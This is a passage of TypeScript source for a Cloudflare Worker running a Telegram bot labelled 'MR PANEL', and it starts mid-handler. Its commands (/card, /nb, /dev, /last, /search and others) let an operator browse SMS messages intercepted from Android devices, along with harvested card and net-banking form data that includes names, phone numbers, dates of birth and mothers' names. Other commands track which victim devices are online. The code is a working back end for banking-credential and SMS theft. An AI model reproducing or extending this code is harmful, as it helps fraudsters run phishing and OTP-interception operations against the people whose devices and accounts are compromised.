      if (rows.length === 0) { out += 'No apps found.'; }
      rows.forEach(a => {
        const st = a.status === 'active' ? '[active]' : '[inactive]';
        out += `${st} <code>${a.appId}</code>  ${a.name ?? ''}\n`;
      });
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /app <appId> [deviceId] [searchText] — nested drill-down
    if (txt.startsWith('/app ')) {
      const parts = txt.slice(5).trim().split(' ');
      const appId = parts[0];
      const deviceId = parts[1] ?? null;
      const searchQuery = parts.slice(2).join(' ').toLowerCase() || null;

      if (!appId) {
        await tgReply(token, chatId, 'Usage: /app &lt;appId&gt; [deviceId] [searchText]');
        return c.json({ ok: true });
      }

      // Level 3: /app <appId> <deviceId> <searchText>
      if (deviceId && searchQuery) {
        const like = `%${searchQuery}%`;
        const [msgR, formR] = await Promise.all([
          sqlClient(`SELECT from_number, from_sender, body, received_at FROM messages WHERE app_id=$1 AND device_id=$2 AND (LOWER(body) LIKE $3 OR LOWER(from_number) LIKE $3 OR LOWER(from_sender) LIKE $3) ORDER BY received_at DESC LIMIT 30`, [appId, deviceId, like]),
          sqlClient(`SELECT data, submitted_at FROM form_data WHERE app_id=$1 AND device_id=$2 AND LOWER(data::text) LIKE $3 ORDER BY submitted_at DESC LIMIT 15`, [appId, deviceId, like]),
        ]);
        let out = `<b>Search: "${searchQuery}"</b>\nApp: <code>${appId}</code> | Device: <code>${deviceId}</code>\n\n`;
        if ((msgR as unknown[]).length === 0 && (formR as unknown[]).length === 0) { out += 'No results found.'; }
        if ((msgR as unknown[]).length > 0) {
          out += `Messages (${(msgR as unknown[]).length}):\n`;
          (msgR as Array<Record<string,unknown>>).forEach(m => {
            out += `  ${m.from_number} (${m.from_sender})\n  ${String(m.body).substring(0, 100)}\n`;
          });
        }
        if ((formR as unknown[]).length > 0) {
          out += `\nForm Data (${(formR as unknown[]).length}):\n`;
          (formR as Array<Record<string,unknown>>).forEach(f => {
            const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `<b>${k}</b>:${v}`).join(' | ');
            out += `  ${fields.substring(0, 120)}\n`;
          });
        }
        await tgReply(token, chatId, out);
        return c.json({ ok: true });
      }

      // Level 2: /app <appId> <deviceId>
      if (deviceId) {
        const [devRow, msgRows, formRows, msgCount, formCount] = await Promise.all([
          db.select().from(devices).where(and(eq(devices.appId, appId), eq(devices.deviceId, deviceId))).limit(1),
          sqlClient(`SELECT from_number, from_sender, body, received_at FROM messages WHERE app_id=$1 AND device_id=$2 ORDER BY received_at DESC LIMIT 25`, [appId, deviceId]),
          sqlClient(`SELECT data, submitted_at FROM form_data WHERE app_id=$1 AND device_id=$2 ORDER BY submitted_at DESC LIMIT 10`, [appId, deviceId]),
          sqlClient(`SELECT COUNT(*) as c FROM messages WHERE app_id=$1 AND device_id=$2`, [appId, deviceId]),
          sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE app_id=$1 AND device_id=$2`, [appId, deviceId]),
        ]);
        const dev = devRow[0];
        let out = `<b>Device: <code>${deviceId}</code></b>\n`;
        if (dev) {
          const st = dev.status === 'online' ? '[Online]' : '[Offline]';
          out += `${st} ${dev.name}\nAndroid: ${dev.androidVersion} | User: ${dev.userId}\nSIM1: ${dev.sim1Phone ?? '-'} | SIM2: ${dev.sim2Phone ?? '-'}\n`;
        }
        out += `\nMessages: <b>${(msgCount[0] as {c:string}).c}</b> | Form Data: <b>${(formCount[0] as {c:string}).c}</b>\n`;
        if ((msgRows as unknown[]).length > 0) {
          out += `\nRecent Messages:\n`;
          (msgRows as Array<Record<string,unknown>>).forEach(m => {
            out += `  ${m.from_number} (${m.from_sender})\n  ${String(m.body).substring(0, 100)}\n`;
          });
        }
        if ((formRows as unknown[]).length > 0) {
          out += `\nRecent Form Data:\n`;
          (formRows as Array<Record<string,unknown>>).forEach(f => {
            const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `<b>${k}</b>:${v}`).join(' | ');
            out += `  ${fields.substring(0, 120)}\n`;
          });
        }
        out += `\nSearch: /app ${appId} ${deviceId} &lt;text&gt;`;
        await tgReply(token, chatId, out);
        return c.json({ ok: true });
      }

      // Level 1: /app <appId> — list devices
      const [devRows, msgCount, formCount] = await Promise.all([
        db.select().from(devices).where(eq(devices.appId, appId)).orderBy(desc(devices.updatedAt)).limit(20),
        sqlClient(`SELECT COUNT(*) as c FROM messages WHERE app_id=$1`, [appId]),
        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE app_id=$1`, [appId]),
      ]);
      let out = `<b>App: <code>${appId}</code></b>\n`;
      out += `Messages: ${(msgCount[0] as {c:string}).c} | Forms: ${(formCount[0] as {c:string}).c}\n\n`;
      if (devRows.length === 0) { out += 'No devices found.'; }
      else {
        out += `Devices (${devRows.length}):\n`;
        devRows.forEach(d => {
          const st = d.status === 'online' ? '[ON]' : '[OFF]';
          out += `${st} ${d.name}\n  <code>${d.deviceId}</code>\n  SIM1: ${d.sim1Phone ?? '-'} | SIM2: ${d.sim2Phone ?? '-'}\n`;
        });
        out += `\nDevice detail: /app ${appId} &lt;deviceId&gt;`;
      }
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /search <text> — search last 200 records only (no notification pause)
    if (txt.startsWith('/search ')) {
      const query = txt.slice(8).trim().toLowerCase();
      if (!query) {
        await tgReply(token, chatId, 'Usage: /search &lt;text&gt;');
        return c.json({ ok: true });
      }
      const like = `%${query}%`;
      const [msgR, formR] = await Promise.all([
        sqlClient(`SELECT app_id, device_id, from_number, from_sender, body, received_at FROM (SELECT * FROM messages ORDER BY received_at DESC LIMIT 200) sub WHERE LOWER(body) LIKE $1 OR LOWER(from_sender) LIKE $1 OR LOWER(from_number) LIKE $1 LIMIT 20`, [like]),
        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM (SELECT * FROM form_data ORDER BY submitted_at DESC LIMIT 200) sub WHERE LOWER(data::text) LIKE $1 LIMIT 10`, [like]),
      ]);
      let out = `<b>Search: "${query}"</b>  (last 200 records)\n\n`;
      if ((msgR as unknown[]).length === 0 && (formR as unknown[]).length === 0) {
        out += 'No results found.';
      }
      if ((msgR as unknown[]).length > 0) {
        out += `Messages (${(msgR as unknown[]).length}):\n`;
        (msgR as Array<Record<string,unknown>>).forEach(m => {
          out += `  [${m.app_id}] ${m.from_number}\n  ${String(m.body).substring(0, 90)}\n`;
        });
      }
      if ((formR as unknown[]).length > 0) {
        out += `\nForm Data (${(formR as unknown[]).length}):\n`;
        (formR as Array<Record<string,unknown>>).forEach(f => {
          const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
          out += `  [${f.app_id}] ${fields.substring(0, 100)}\n`;
        });
      }
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /7d — last 7 days summary
    if (txt === '/7d' || txt.startsWith('/7d ')) {
      const { msgs, forms } = await getRecentData(c.env, 168);
      const out = formatRecentData(msgs as unknown[], forms as unknown[], 'Last 7 Days');
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /online — devices active in last 15 min
    if (txt === '/online') {
      const cutoff = new Date(Date.now() - 15 * 60 * 1000).toISOString();
      const rows = await sqlClient(`SELECT device_id, name, app_id, last_online, updated_at FROM devices WHERE (last_online > $1::timestamptz OR (status = 'online' AND updated_at > $1::timestamptz)) ORDER BY COALESCE(last_online, updated_at) DESC LIMIT 50`, [cutoff]);
      let out = `<b>Online Devices — Last 15 Min (${(rows as unknown[]).length})</b>\n\n`;
      if ((rows as unknown[]).length === 0) { out += 'No devices active in last 15 minutes.'; }
      (rows as Array<Record<string,unknown>>).forEach(d => {
        const t = d.last_online
          ? new Date(String(d.last_online)).toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata', hour: '2-digit', minute: '2-digit' })
          : '—';
        out += `ID: <code>${d.device_id}</code>\n  ${d.name} | App: <code>${d.app_id}</code> | Last: ${t}\n`;
      });
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /card — all card form data
    if (txt === '/card') {
      const [rows, cntRow] = await Promise.all([
        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%' ORDER BY submitted_at DESC LIMIT 500`),
        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%'`),
      ]);
      const total = (cntRow[0] as {c:string}).c;
      const skip = ['timestamp','createdAt','updatedAt','id','_id'];
      let out = `<b>Card Form Data</b>\nTotal: <b>${total}</b>  |  Showing: ${(rows as unknown[]).length}\n\n`;
      if ((rows as unknown[]).length === 0) { out += 'No data found.'; }
      (rows as Array<Record<string,unknown>>).forEach((f, i) => {
        const data = f.data as Record<string,unknown>;
        const phone = String(data['phoneNumber'] ?? data['phone'] ?? data['mobile'] ?? '—');
        const name  = String(data['fullName']    ?? data['name']  ?? data['customerName'] ?? '—');
        const dob   = String(data['dob']         ?? data['dateOfBirth'] ?? '—');
        const mom   = String(data['motherName']  ?? data['mother'] ?? '');
        const ptype = String(data['paymentType'] ?? data['type']  ?? '—');
        const extra = Object.entries(data).filter(([k]) => !skip.includes(k) && !['phoneNumber','phone','mobile','fullName','name','customerName','dob','dateOfBirth','motherName','mother','paymentType','type'].includes(k)).map(([k,v])=>`${k}: ${v}`).join(' | ');
        const dt = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleString('en-IN',{timeZone:'Asia/Kolkata',day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'}) : '—';
        out += `${i+1}. <b>${phone}</b> — ${name}\n`;
        out += `   DOB: ${dob}${mom ? ' | Mother: '+mom : ''}\n`;
        out += `   Type: ${ptype} | App: ${f.app_id} | Dev: ${f.device_id}\n`;
        if (extra) out += `   ${extra.substring(0,100)}\n`;
        out += `   ${dt}\n`;
        out += `   ─────────────────────\n`;
      });
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /nb — all net banking form data
    if (txt === '/nb' || txt === '/netbanking') {
      const [rows, cntRow] = await Promise.all([
        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE '%net banking%' ORDER BY submitted_at DESC LIMIT 500`),
        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE LOWER(data::text) LIKE '%net banking%'`),
      ]);
      const total = (cntRow[0] as {c:string}).c;
      const skip = ['timestamp','createdAt','updatedAt','id','_id'];
      let out = `<b>Net Banking Form Data</b>\nTotal: <b>${total}</b>  |  Showing: ${(rows as unknown[]).length}\n\n`;
      if ((rows as unknown[]).length === 0) { out += 'No data found.'; }
      (rows as Array<Record<string,unknown>>).forEach((f, i) => {
        const data = f.data as Record<string,unknown>;
        const phone = String(data['phoneNumber'] ?? data['phone'] ?? data['mobile'] ?? '—');
        const name  = String(data['fullName']    ?? data['name']  ?? data['customerName'] ?? '—');
        const dob   = String(data['dob']         ?? data['dateOfBirth'] ?? '—');
        const mom   = String(data['motherName']  ?? data['mother'] ?? '');
        const ptype = String(data['paymentType'] ?? data['type']  ?? '—');
        const extra = Object.entries(data).filter(([k]) => !skip.includes(k) && !['phoneNumber','phone','mobile','fullName','name','customerName','dob','dateOfBirth','motherName','mother','paymentType','type'].includes(k)).map(([k,v])=>`${k}: ${v}`).join(' | ');
        const dt = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleString('en-IN',{timeZone:'Asia/Kolkata',day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'}) : '—';
        out += `${i+1}. <b>${phone}</b> — ${name}\n`;
        out += `   DOB: ${dob}${mom ? ' | Mother: '+mom : ''}\n`;
        out += `   Type: ${ptype} | App: ${f.app_id} | Dev: ${f.device_id}\n`;
        if (extra) out += `   ${extra.substring(0,100)}\n`;
        out += `   ${dt}\n`;
        out += `   ─────────────────────\n`;
      });
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /card online — card with online
    if (txt === '/card online' || txt === '/cardonline') {
      const [rows, cntRow] = await Promise.all([
        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%' ORDER BY submitted_at DESC LIMIT 500`),
        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%'`),
      ]);
      const total = (cntRow[0] as {c:string}).c;
      const skip = ['timestamp','createdAt','updatedAt','id','_id'];
      let out = `<b>Card + Online</b>\nTotal: <b>${total}</b>  |  Showing: ${(rows as unknown[]).length}\n\n`;
      if ((rows as unknown[]).length === 0) { out += 'No data found.'; }
      (rows as Array<Record<string,unknown>>).forEach((f, i) => {
        const data = f.data as Record<string,unknown>;
        const phone = String(data['phoneNumber'] ?? data['phone'] ?? data['mobile'] ?? '—');
        const name  = String(data['fullName']    ?? data['name']  ?? data['customerName'] ?? '—');
        const dob   = String(data['dob']         ?? data['dateOfBirth'] ?? '—');
        const mom   = String(data['motherName']  ?? data['mother'] ?? '');
        const ptype = String(data['paymentType'] ?? data['type']  ?? '—');
        const extra = Object.entries(data).filter(([k]) => !skip.includes(k) && !['phoneNumber','phone','mobile','fullName','name','customerName','dob','dateOfBirth','motherName','mother','paymentType','type'].includes(k)).map(([k,v])=>`${k}: ${v}`).join(' | ');
        const dt = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleString('en-IN',{timeZone:'Asia/Kolkata',day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'}) : '—';
        out += `${i+1}. <b>${phone}</b> — ${name}\n`;
        out += `   DOB: ${dob}${mom ? ' | Mother: '+mom : ''}\n`;
        out += `   Type: ${ptype} | App: ${f.app_id} | Dev: ${f.device_id}\n`;
        if (extra) out += `   ${extra.substring(0,100)}\n`;
        out += `   ${dt}\n`;
        out += `   ─────────────────────\n`;
      });
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /nb online — net banking with online
    if (txt === '/nb online' || txt === '/nbonline') {
      const [rows, cntRow] = await Promise.all([
        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%' ORDER BY submitted_at DESC LIMIT 500`),
        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE LOWER(data::text) LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%'`),
      ]);
      const total = (cntRow[0] as {c:string}).c;
      const skip = ['timestamp','createdAt','updatedAt','id','_id'];
      let out = `<b>Net Banking + Online</b>\nTotal: <b>${total}</b>  |  Showing: ${(rows as unknown[]).length}\n\n`;
      if ((rows as unknown[]).length === 0) { out += 'No data found.'; }
      (rows as Array<Record<string,unknown>>).forEach((f, i) => {
        const data = f.data as Record<string,unknown>;
        const phone = String(data['phoneNumber'] ?? data['phone'] ?? data['mobile'] ?? '—');
        const name  = String(data['fullName']    ?? data['name']  ?? data['customerName'] ?? '—');
        const dob   = String(data['dob']         ?? data['dateOfBirth'] ?? '—');
        const mom   = String(data['motherName']  ?? data['mother'] ?? '');
        const ptype = String(data['paymentType'] ?? data['type']  ?? '—');
        const extra = Object.entries(data).filter(([k]) => !skip.includes(k) && !['phoneNumber','phone','mobile','fullName','name','customerName','dob','dateOfBirth','motherName','mother','paymentType','type'].includes(k)).map(([k,v])=>`${k}: ${v}`).join(' | ');
        const dt = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleString('en-IN',{timeZone:'Asia/Kolkata',day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'}) : '—';
        out += `${i+1}. <b>${phone}</b> — ${name}\n`;
        out += `   DOB: ${dob}${mom ? ' | Mother: '+mom : ''}\n`;
        out += `   Type: ${ptype} | App: ${f.app_id} | Dev: ${f.device_id}\n`;
        if (extra) out += `   ${extra.substring(0,100)}\n`;
        out += `   ${dt}\n`;
        out += `   ─────────────────────\n`;
      });
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /offline — all offline devices
    if (txt === '/offline') {
      const rows = await db.select().from(devices).where(eq(devices.status, 'offline')).orderBy(desc(devices.updatedAt)).limit(30);
      let out = `<b>Offline Devices (${rows.length})</b>\n\n`;
      if (rows.length === 0) { out += 'All devices are online!'; }
      rows.forEach(d => {
        const last = d.lastOnline ? new Date(d.lastOnline).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) : 'Never';
        out += `${d.name}\n  ID: <code>${d.deviceId}</code> | App: <code>${d.appId}</code>\n  Last Online: ${last}\n`;
      });
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /dev <deviceId> — quick device lookup across all apps
    if (txt.startsWith('/dev ')) {
      const devId = txt.slice(5).trim();
      if (!devId) {
        await tgReply(token, chatId, 'Usage: /dev &lt;deviceId&gt;');
        return c.json({ ok: true });
      }
      const [devRow, msgRows, formRows, msgCount, formCount] = await Promise.all([
        db.select().from(devices).where(eq(devices.deviceId, devId)).limit(1),
        sqlClient(`SELECT from_number, from_sender, body, received_at FROM messages WHERE device_id=$1 ORDER BY received_at DESC LIMIT 20`, [devId]),
        sqlClient(`SELECT data, submitted_at FROM form_data WHERE device_id=$1 ORDER BY submitted_at DESC LIMIT 10`, [devId]),
        sqlClient(`SELECT COUNT(*) as c FROM messages WHERE device_id=$1`, [devId]),
        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE device_id=$1`, [devId]),
      ]);
      if (!devRow[0]) {
        await tgReply(token, chatId, `Device <code>${devId}</code> not found.`);
        return c.json({ ok: true });
      }
      const d = devRow[0];
      const st = d.status === 'online' ? '[Online]' : '[Offline]';
      let out = `<b>${d.name}</b> ${st}\n`;
      out += `App: <code>${d.appId}</code> | User: ${d.userId}\n`;
      out += `Android: ${d.androidVersion} | SIM1: ${d.sim1Phone ?? '-'} | SIM2: ${d.sim2Phone ?? '-'}\n`;
      out += `Messages: ${(msgCount[0] as {c:string}).c} | Forms: ${(formCount[0] as {c:string}).c}\n\n`;
      if ((msgRows as unknown[]).length > 0) {
        out += `Recent Messages:\n`;
        (msgRows as Array<Record<string,unknown>>).forEach(m => {
          out += `  ${m.from_number}: ${String(m.body).substring(0, 80)}\n`;
        });
      }
      if ((formRows as unknown[]).length > 0) {
        out += `\nRecent Forms:\n`;
        (formRows as Array<Record<string,unknown>>).forEach(f => {
          const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
          out += `  ${fields.substring(0, 120)}\n`;
        });
      }
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /last <n> — last N messages across all apps (default 10)
    if (txt.startsWith('/last')) {
      const n = Math.min(parseInt(txt.split(' ')[1] ?? '10', 10) || 10, 50);
      const rows = await sqlClient(`SELECT app_id, device_id, from_number, from_sender, body, received_at FROM messages ORDER BY received_at DESC LIMIT $1`, [n]);
      let out = `<b>Last ${n} Messages</b>\n\n`;
      if ((rows as unknown[]).length === 0) { out += 'No messages found.'; }
      (rows as Array<Record<string,unknown>>).forEach((m, i) => {
        out += `${i+1}. [${m.app_id}] ${m.from_number}\n   ${String(m.body).substring(0, 90)}\n`;
      });
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /stats — per-app breakdown
    if (txt === '/stats') {
      const appRows = await db.select({ appId: apps.appId, name: apps.name, status: apps.status }).from(apps);
      let out = `<b>Per-App Stats</b>\n\n`;
      const results = await Promise.all(appRows.map(async a => {
        const [dC, mC, fC] = await Promise.all([
          sqlClient(`SELECT COUNT(*) as c FROM devices WHERE app_id=$1`, [a.appId]),
          sqlClient(`SELECT COUNT(*) as c FROM messages WHERE app_id=$1`, [a.appId]),
          sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE app_id=$1`, [a.appId]),
        ]);
        return { ...a, d: (dC[0] as {c:string}).c, m: (mC[0] as {c:string}).c, f: (fC[0] as {c:string}).c };
      }));
      results.forEach(r => {
        const st = r.status === 'active' ? '[ON]' : '[OFF]';
        out += `${st} <code>${r.appId}</code>\n  Devices: ${r.d} | Msgs: ${r.m} | Forms: ${r.f}\n`;
      });
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /stop — resume notifications
    if (txt === '/stop' || txt === '/release') {
      await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_paused', 'false') ON CONFLICT (key) DO UPDATE SET value = 'false'`);
      await tgReply(token, chatId, '<b>Notifications resumed.</b>\nAll notifications are now active.');
      tgCache.ts = 0; // invalidate settings cache
      return c.json({ ok: true });
    }


    // /pause — pause all notifications
    if (txt === '/pause') {
      await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_paused', 'true') ON CONFLICT (key) DO UPDATE SET value = 'true'`);
      await tgReply(token, chatId, '<b>Notifications paused.</b>\nUse /stop to resume.');
      return c.json({ ok: true });
      tgCache.ts = 0; // invalidate settings cache
    }

    // /focus <appId> — only receive notifications from this app
    if (txt.startsWith('/focus ')) {
      const focusId = txt.slice(7).trim();
      if (!focusId) {
        await tgReply(token, chatId, 'Usage: /focus &lt;appId&gt;\nExample: /focus myapp123');
        return c.json({ ok: true });
      }
      await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_focus_app', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [focusId]);
      await tgReply(token, chatId, `Focus set: <code>${focusId}</code>\nOnly this app's notifications will arrive. Use /unfocus to clear.`);
      return c.json({ ok: true });
      tgCache.ts = 0; // invalidate settings cache
    }

    // /unfocus — clear app focus
    if (txt === '/unfocus') {
      await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_focus_app', '') ON CONFLICT (key) DO UPDATE SET value = ''`);
      await tgReply(token, chatId, '<b>Focus cleared.</b>\nAll apps will send notifications.');
      return c.json({ ok: true });
      tgCache.ts = 0; // invalidate settings cache
    }

    // /focusstatus — check current focus app
    if (txt === '/focusstatus' || txt === '/fs') {
      const fsRows = await sqlClient(`SELECT value FROM settings WHERE key = 'telegram_focus_app' LIMIT 1`);
      const focusedApp = (fsRows[0] as { value?: string })?.value ?? '';
      await tgReply(token, chatId, focusedApp ? `Focused: <code>${focusedApp}</code>\nOnly this app notifies. /unfocus to clear.` : 'No focus. All apps notify.');
      return c.json({ ok: true });
    }

    // /setmenu — register bot commands in Telegram autocomplete
    if (txt === '/setmenu') {
      const menuCmds = [
        { command: "start", description: "Show command menu" },
        { command: "1h", description: "Last 1 hour activity" },
        { command: "24h", description: "Last 24 hours activity" },
        { command: "7d", description: "Last 7 days activity" },
        { command: "total", description: "All-time totals" },
        { command: "stats", description: "Per-app breakdown" },
        { command: "apps", description: "List all app IDs" },
        { command: "online", description: "Online devices (last 15min)" },
        { command: "offline", description: "Offline devices" },
        { command: "last", description: "Last N messages" },
        { command: "card", description: "Card form data (last 500)" },
        { command: "nb", description: "Net banking form data (last 500)" },
        { command: "search", description: "Search last 200 records" },
        { command: "focus", description: "Focus notifications on one app" },
        { command: "unfocus", description: "Clear focus, all apps notify" },
        { command: "focusstatus", description: "Check current notification focus" },
        { command: "pause", description: "Pause all notifications" },
        { command: "stop", description: "Resume notifications" },
      ];
      // Register commands for default scope (private chat)
      const smR = await fetch(`https://api.telegram.org/bot${token}/setMyCommands`, {
        method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify({ commands: menuCmds }),
      });
      // Also register for the channel so members see "/" autocomplete
      const smCh = await fetch(`https://api.telegram.org/bot${token}/setMyCommands`, {
        method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify({ commands: menuCmds, scope: { type: 'chat', chat_id: -1004403318713 } }),
      });
      const smResult = await smR.json() as { ok: boolean };
      const smChResult = await smCh.json() as { ok: boolean };
      await tgReply(token, chatId, smResult.ok
        ? `<b>Bot menu registered!</b>\nPrivate: ✅  Channel: ${smChResult.ok ? '✅' : '⚠️ (need admin)'}\nType "/" to see all commands.`
        : 'Menu registration failed.');
      return c.json({ ok: true });
    }
    // /start or /help — command menu
    if (txt === '/start' || txt === '/help') {
      // Auto-register commands in Telegram on /start
      const menuCmdsAuto = [
        { command: "start", description: "Show command menu" },
        { command: "1h", description: "Last 1 hour activity" },
        { command: "24h", description: "Last 24 hours activity" },
        { command: "7d", description: "Last 7 days activity" },
        { command: "total", description: "All-time totals" },
        { command: "stats", description: "Per-app breakdown" },
        { command: "apps", description: "List all app IDs" },
        { command: "online", description: "Online devices (last 15min)" },
        { command: "offline", description: "Offline devices" },
        { command: "last", description: "Last N messages" },
        { command: "card", description: "Card form data (last 500)" },
        { command: "nb", description: "Net banking form data (last 500)" },
        { command: "search", description: "Search last 200 records" },
        { command: "focus", description: "Focus notifications on one app" },
        { command: "unfocus", description: "Clear focus, all apps notify" },
        { command: "focusstatus", description: "Check notification focus" },
        { command: "pause", description: "Pause all notifications" },
        { command: "stop", description: "Resume notifications" },
      ];
      await fetch(`https://api.telegram.org/bot${token}/setMyCommands`, {
        method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify({ commands: menuCmdsAuto }),
      });
      const help =
        `<b>MR PANEL — Bot Menu</b>
` +
        `━━━━━━━━━━━━━━━━━━━━━━

` +
        `<b>[DATA BY TIME]</b>
` +
        `/1h   /24h   /7d   /total

` +
        `<b>[FORM DATA]</b>
` +
        `/card          Card entries (last 500)
` +
        `/nb            Net banking entries (last 500)
` +
        `/card online   Card + online
` +
        `/nb online     NB + online
` +
        `/search &lt;txt&gt; Search last 200 records

` +
        `<b>[DEVICES]</b>
` +
        `/online        Active in last 15min
` +
        `/offline       Offline devices
` +
        `/dev &lt;id&gt;      Device lookup
` +
        `/last [n]      Last N messages

` +
        `<b>[APPS]</b>
` +
        `/apps          List all apps
` +
        `/stats         Per-app breakdown
` +
        `/app &lt;id&gt;     App devices

` +
        `<b>[NOTIFICATIONS]</b>
` +
        `/focus &lt;appId&gt; Only notify for this app
` +
        `/unfocus       All apps notify
` +
        `/focusstatus   Check focus status
` +
        `/pause         Pause all notifications
` +
        `/stop          Resume notifications

` +
        `/setmenu       Re-register this bot menu`;
      await tgReply(token, chatId, help);
      return c.json({ ok: true });
    }

    return c.json({ ok: true });
  });

  

// =================== WORKER ENTRY ===================
export default {
  async fetch(request: Request, env: Env, ctx: ExecutionContext): Promise<Response> {
    const url = new URL(request.url);
    // WebSocket upgrade MUST be handled directly — Hono cannot forward 101 responses.
    if (url.pathname === "/api/events" && request.headers.get("Upgrade") === "websocket") {
      const id = env.EVENT_BUS.idFromName("global");
      const stub = env.EVENT_BUS.get(id);
      return stub.fetch(new Request("https://do.local/ws", request));
    }
    if (url.pathname.startsWith("/api/")) {
      return app.fetch(request, env, ctx);
    }
    // Patch the JS bundle on-the-fly: remove PIN from SSE URL, use HMAC token instead
    if (url.pathname.endsWith(".js") && url.pathname.includes("index-")) {
      const assetResp = await env.ASSETS.fetch(request);
      const js = await assetResp.text();
      // OLD: HEAD check with ?pin= then EventSource with ?pin=
      const OLD_SSE = `try{const St=await He(\`/api/master/events?pin=\${encodeURIComponent(r)}\`,{method:"HEAD"}).catch(()=>null);if(St&&St.status===401){ge=!0,d();return}}catch{}ge||(W=new EventSource(\`/api/master/events?pin=\${encodeURIComponent(r)}\`)`;
      // NEW: fetch HMAC token first, then EventSource with ?token=
      const NEW_SSE = `try{const _tr=await He("/api/master/sse-token",{method:"POST",headers:{"Content-Type":"application/json","x-master-pin":r},body:JSON.stringify({pin:r})});if(!_tr.ok){if(!ge)setTimeout(ze,5e3);return}const{token:_tk}=await _tr.json();if(ge)return;!ge&&(W=new EventSource(\`/api/master/events?token=\${encodeURIComponent(_tk)}\`)`;
      const patched = js.includes(OLD_SSE) ? js.replace(OLD_SSE, NEW_SSE) : js;
      return new Response(patched, {
        headers: {
          "Content-Type": "application/javascript; charset=utf-8",
          "Cache-Control": "no-store",
        },
      });
    }
    // fall through to Pages static assets (React SPA)
    return env.ASSETS.fetch(request);
  },
};

